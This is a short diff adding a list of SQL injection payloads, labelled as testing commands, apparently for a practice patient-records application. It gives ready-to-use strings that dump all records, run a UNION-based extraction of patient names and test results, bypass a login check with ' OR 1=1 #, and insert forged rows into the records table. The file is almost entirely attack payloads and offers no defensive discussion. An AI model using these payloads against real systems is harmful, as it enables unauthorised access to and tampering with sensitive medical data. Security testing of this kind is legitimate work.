@@ -1,0 +1,10 @@
+TESTING COMMANDS:
+RETRIVAL:
+1. For retrival of all records:- ' OR '1'='1'; #
+2. To Retrieve Specific limit Record: ' OR 1=1 LIMIT 1; # , ' OR 1=1 ORDER BY patient_id DESC LIMIT 15; #
+3. For Union-Based Injection: ' UNION SELECT patient_id, Name, '', '', '', '', '', '', '', '', '', '', '', '', Test_Results FROM vpatientsrecord WHERE patient_id = 123 LIMIT 1; #
+4. retrive record with name: 'OR Name LIKE 'P%P'; #
+
+UPDATE/INSERT:
+FOR LOGIN: ' OR 1=1 #
+For insert data: Hacker', 30, 'Male', 'O+', 'Injected Data', '2024-03-15', 'Evil Doctor', 'Evil Insurance', 10000.00, 101, 'Emergency', '2024-03-20', 'Evil Medicine', 'Evil Test'); #
